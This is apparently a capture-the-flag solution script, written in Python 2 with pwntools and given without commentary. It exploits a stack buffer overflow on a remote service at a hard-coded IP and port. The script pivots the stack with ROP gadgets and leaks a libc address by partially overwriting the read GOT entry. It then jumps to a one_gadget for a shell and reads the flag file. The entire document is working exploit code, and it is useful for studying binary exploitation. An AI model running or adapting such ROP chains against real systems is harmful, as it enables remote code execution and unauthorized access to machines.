from random import *
from time import *
from pwn import *

buf = 0x601048
buf2 = 0x601700
bufx = 0x601c00

pop_rbp = 0x400560
pop_rdi = 0x4006b3
pop_rsi_r15 = 0x4006b1
leave = 0x400646

read_plt = 0x4004c0
read_got = 0x601020
read = 0x40062b
read_res = 0x4004c6

nop = 0x90
padding = 'a' * (40 - 8)

#r = remote('localhost', 10135)
r = remote('140.112.31.96', 10135)
context.arch = "amd64"

r.send(padding + p64(buf + 32) + p64(read))
r.send(p64(pop_rdi) + p64(0x1) + p64(read_plt) + p64(pop_rbp) + p64(bufx + 32) + p64(read))
r.send(p64(0x1bd2) * 4 + p64(buf + 64) + p64(read))
r.send(p64(buf2) + p64(leave) + p64(0) * 2 + p64(bufx + 32) + p64(read))
r.send(p64(0x1bd2) * 4 + p64(buf2 + 32) + p64(read))
r.send(p64(bufx+0x20) + p64(pop_rsi_r15) + p64(bufx) + p64(0) + p64(bufx + 32) + p64(read))
r.send(p64(0x1bd2) * 4 + p64(buf2 + 64) + p64(read))
r.send(p64(pop_rdi) + p64(0) + p64(read_res) + p64(leave) + p64(bufx + 32) + p64(read))
r.send(p64(0x1bd2) * 4 + p64(read_got + 0x20) + p64(read))
r.send("\x80")

r.recvuntil(":")
a = u64(r.recv()[:8])
print hex(a)
write_off = 0xf7280

base = a - write_off
one_gadget = 0x4526a

r.send(p64(pop_rdi) + p64(0x1) + p64(read_plt) + p64(pop_rbp) + p64(read_got + 0x20) + p64(read))
r.send(p64(one_gadget+ base))
sleep(1)
r.sendline("cat /home/readme/flag\nls\n")
print r.recv()
